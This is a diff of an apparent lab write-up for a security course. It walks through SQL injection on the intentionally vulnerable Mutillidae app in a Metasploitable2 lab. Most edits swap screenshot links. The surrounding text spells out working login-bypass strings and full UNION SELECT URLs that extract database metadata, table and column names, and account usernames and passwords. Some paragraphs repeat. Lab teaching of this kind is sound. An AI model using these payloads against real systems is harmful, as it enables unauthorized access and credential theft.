@@ -21,27 +21,30 @@ Open terminal and try execute some kali linux commands
 
 ## EXECUTION STEPS AND ITS OUTPUT:
 SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
-![Screenshot 2024-04-28 204119](https://github.com/Narasimhan05/sqlinjection/assets/132819871/9b222e53-2fb5-4265-bfd5-0da55d77eef3)
+![Screenshot 2024-04-28 224454](https://github.com/Narasimhan05/sqlinjection/assets/132819871/19e9ab15-0d13-44a3-bbf1-76397f80e406)
 
 Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser. 
-![Screenshot 2024-04-28 204137](https://github.com/Narasimhan05/sqlinjection/assets/132819871/bddb8c0a-dce5-46a9-bd84-d33652832350)
-
+![Screenshot 2024-04-28 224449](https://github.com/Narasimhan05/sqlinjection/assets/132819871/778461cc-0803-438a-8795-ecc11d932061)
 
 Select Multidae from the menu listed as shown above. You will get the page as displayed below:
+![Screenshot 2024-04-28 224437](https://github.com/Narasimhan05/sqlinjection/assets/132819871/21b85a76-a006-4edf-ae93-b1803d0408f2)
 
-![Screenshot 2024-04-28 204231](https://github.com/Narasimhan05/sqlinjection/assets/132819871/2e9ee144-ccdf-4925-8e03-bd325d1d40b4)
+Click on the menu Login/Register and register for an account
+![Screenshot 2024-04-28 224442](https://github.com/Narasimhan05/sqlinjection/assets/132819871/3005b498-8e87-4587-b1fb-f80e99069f04)
 
 Click on the link “Please register here”
+![Screenshot 2024-04-28 224430](https://github.com/Narasimhan05/sqlinjection/assets/132819871/8f33f1bb-c10c-40fa-91d9-0952998c6806)
 
-![Screenshot 2024-04-28 204324](https://github.com/Narasimhan05/sqlinjection/assets/132819871/89ae561e-39eb-4880-9b86-2a12d19ef18a)
+Click on “Create Account” to display the following page:
+![Screenshot 2024-04-28 224425](https://github.com/Narasimhan05/sqlinjection/assets/132819871/9f93cbbd-eac2-4bcf-bc50-68bb7bbb07c9)
 
 The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:
 
 ($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
-![Screenshot 2024-04-28 204334](https://github.com/Narasimhan05/sqlinjection/assets/132819871/0c82b1fb-f9f5-42c6-a5e1-4ae2cb03eac6)
+![Screenshot 2024-04-28 224420](https://github.com/Narasimhan05/sqlinjection/assets/132819871/399fbbc6-9229-4f99-be87-2fd8afa2f447)
 
 Click “Login”. The logged in page will show as below:
-![Screenshot 2024-04-28 204348](https://github.com/Narasimhan05/sqlinjection/assets/132819871/b1c903ee-46c7-4862-8755-fa371003a12c)
+![Screenshot 2024-04-28 224416](https://github.com/Narasimhan05/sqlinjection/assets/132819871/eddcefac-c572-425e-a8a2-fde5d8354f9d)
 
 ##Bypassing login field
 
@@ -49,20 +52,27 @@ The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the user
 
 Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
 
-![Screenshot 2024-04-28 204413](https://github.com/Narasimhan05/sqlinjection/assets/132819871/6562ead4-ae10-4b26-a8f3-be191340178b)
+![Screenshot 2024-04-28 224408](https://github.com/Narasimhan05/sqlinjection/assets/132819871/63ddcfc4-3146-4d3d-bf69-6f41724783fd)
 
 Click the login button and you will see it enter into the administrator page.
-![Screenshot 2024-04-28 204431](https://github.com/Narasimhan05/sqlinjection/assets/132819871/5a60d64e-b60c-4a21-9645-950a183e7802)
+![Screenshot 2024-04-28 224403](https://github.com/Narasimhan05/sqlinjection/assets/132819871/eb2e344c-c218-46d0-8fc9-1f50adfe52fe)
 
 Union-based SQL injection
 UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”
 
 After logging out, Now choose the menu as shown below: img
-![Screenshot 2024-04-28 204455](https://github.com/Narasimhan05/sqlinjection/assets/132819871/a06e9dce-d218-46e8-9fdc-b0f09a67f7cd)
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.11.png)
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.12.png)
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.13.png)
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.14.png)
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.15.png)
+![Screenshot 2024-04-28 224358](https://github.com/Narasimhan05/sqlinjection/assets/132819871/72e80f17-a69e-4683-99f8-9631bde7031d)
+![Screenshot 2024-04-28 224354](https://github.com/Narasimhan05/sqlinjection/assets/132819871/cdc7c92f-e9f3-48f7-bfa2-39e12471b70b)
+![Screenshot 2024-04-28 224349](https://github.com/Narasimhan05/sqlinjection/assets/132819871/a239726d-47cd-4341-9d58-672dffb42e39)
 
 From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
-
-![Screenshot 2024-04-28 204501](https://github.com/Narasimhan05/sqlinjection/assets/132819871/13ebc3ef-5505-47f7-b937-bb1445800326)
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.16.png)
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.17.png)
 
 Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.
 
@@ -71,31 +81,30 @@ http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%2
 
 
 After adding the order by 6 into the existing url , the following error statement will be obtained:
-![Screenshot 2024-04-28 204513](https://github.com/Narasimhan05/sqlinjection/assets/132819871/5a305261-e65f-4d81-a380-463955ef7f6b)
 
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.19.png)
 When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
-![Screenshot 2024-04-28 204542](https://github.com/Narasimhan05/sqlinjection/assets/132819871/a80f5266-b9aa-4f13-884b-9cc4dd209b49)
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.20.png)
 
 As it is having 5 columns the query worked fine and it provides the correct result
-![Screenshot 2024-04-28 204551](https://github.com/Narasimhan05/sqlinjection/assets/132819871/c24225d4-98ff-4d39-885a-0cf6ebcf95fd)
-
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.21.png)
 Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
-![Screenshot 2024-04-28 204559](https://github.com/Narasimhan05/sqlinjection/assets/132819871/b81167ee-6f0b-4a7c-b9dc-41c98cebba49)
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.22.png)
 
 As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
-![Screenshot 2024-04-28 204606](https://github.com/Narasimhan05/sqlinjection/assets/132819871/6b10f95a-3269-410e-8cfa-bcc896ed7e71)
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.23.png)
 
 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
 
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
 
-![Screenshot 2024-04-28 204616](https://github.com/Narasimhan05/sqlinjection/assets/132819871/368498c8-276b-4de2-923c-ba928ef9c59a)
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.24.png)
 The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.
 
 Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
 
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
-![Screenshot 2024-04-28 204625](https://github.com/Narasimhan05/sqlinjection/assets/132819871/7051f906-6fb9-497c-9aa4-bca824231b39)
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.25.png)
 
 The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords
 
@@ -108,10 +117,9 @@ Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns wher
 Here we are trying to extract column names from the “accounts” table.
 
 The column names of the accounts is displayed below for the following url:
-![Screenshot 2024-04-28 204634](https://github.com/Narasimhan05/sqlinjection/assets/132819871/a0e8c85f-033b-4b6a-97d1-70589a38ad82)
-
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.26.png)
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
-![Screenshot 2024-04-28 205525](https://github.com/Narasimhan05/sqlinjection/assets/132819871/4f0461c6-325c-41a6-91e8-eb2b7e7f5232)
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.27.png)
 
 The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords
 
@@ -122,13 +130,11 @@ In MySQL, the table “information_schema.columns” gives data about columns in
 Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).
 
 Here we are trying to extract column names from the “accounts” table.
-![Screenshot 2024-04-28 205530](https://github.com/Narasimhan05/sqlinjection/assets/132819871/f304a854-bca5-495f-b186-b20b91e7da6e)
-
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.28.png)
 The column names of the accounts is displayed below for the following url:
 
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
-![Screenshot 2024-04-28 205535](https://github.com/Narasimhan05/sqlinjection/assets/132819871/89c0ac68-7f29-4a47-b6cd-e0f947f9a430)
-
+![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.29.png)
 Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.
 
 Ex: (union select 1,username,password,is_admin,5 from accounts).
